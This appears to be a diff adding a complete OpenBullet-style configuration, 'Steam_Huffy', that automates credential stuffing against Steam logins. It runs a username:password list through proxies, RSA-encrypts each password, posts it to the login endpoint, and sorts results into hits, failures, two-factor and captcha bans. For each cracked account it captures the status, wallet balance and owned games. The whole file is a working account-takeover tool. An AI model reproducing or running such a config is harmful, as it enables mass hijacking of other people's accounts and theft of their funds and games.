@@ -1,0 +1,115 @@
+[SETTINGS]
+{
+  "Name": "Steam_Huffy",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-16T15:55:46.4965468+08:00",
+  "AdditionalInfo": "",
+  "Author": "Huffy",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://store.steampowered.com/login/?l=english" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "<title>Login</title>" 
+
+REQUEST POST "https://store.steampowered.com/login/getrsakey/" 
+  CONTENT "username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/javascript, text/html, application/xml, text/xml, */*" 
+  HEADER "referer: https://store.steampowered.com/login/?l=english" 
+
+PARSE "<SOURCE>" LR "publickey_mod\":\"" "\",\"" -> VAR "publickey" 
+
+PARSE "<SOURCE>" LR "publickey_exp\":\"" "\",\"" -> VAR "rsaexp" 
+
+PARSE "<SOURCE>" LR "timestamp\":\"" "\"," -> VAR "rsatime" 
+
+FUNCTION RSA "<publickey>" "<rsaexp>" "<PASS>" -> VAR "RSA" 
+
+FUNCTION URLEncode "<RSA>" -> VAR "RSAurl" 
+
+REQUEST POST "https://store.steampowered.com/login/dologin/" 
+  CONTENT "username=<USER>&emailauth=&captchagid=&captcha_text=&emailsteamid=&password=<RSAurl>&rsatimestamp=<rsatime>&remember_login=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/javascript, text/html, application/xml, text/xml, */*" 
+  HEADER "referer: https://store.steampowered.com/login/?l=english" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect account name or password." 
+    KEY "The account name or password that you have entered is incorrect" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "requires_twofactor\":true,\"" 
+    KEY "emailauth_needed\":true" 
+  KEYCHAIN Ban OR 
+    KEY "captcha_needed\":true" 
+
+PARSE "<SOURCE>" LR "steamid\":\"" "\",\"" -> VAR "steamid" 
+
+REQUEST GET "https://store.steampowered.com/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "referer: https://store.steampowered.com/login/?l=english" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "s account</title>" 
+
+PARSE "<SOURCE>" LR "account_manage_label\">Status" "class=\"account_manage_link" -> VAR "stat" 
+
+PARSE "<stat>" LR "\">" "</a>" -> CAP "Status" 
+
+PARSE "<SOURCE>" LR "username\" href=\"https://steamcommunity.com/id/" "/home/\"" -> VAR "username" 
+
+PARSE "<SOURCE>" LR "accountData price\">" "</div>" -> CAP "Wallet Balance" 
+
+REQUEST GET "https://steamcommunity.com/profiles/<steamid>/games/?tab=all" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "referer: https://store.steampowered.com/login/?l=english" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain ",\"name\":\"" 
+
+PARSE "<SOURCE>" LR "var rgGames = " "var rgChangingGames " -> VAR "gamtotal" 
+
+FUNCTION CountOccurrences ",\"name\":\"" "<gamtotal>" -> CAP "Total Games" 
+
+PARSE "<SOURCE>" LR ",\"name\":\"" "\",\"" Recursive=TRUE -> CAP "Games" 
+
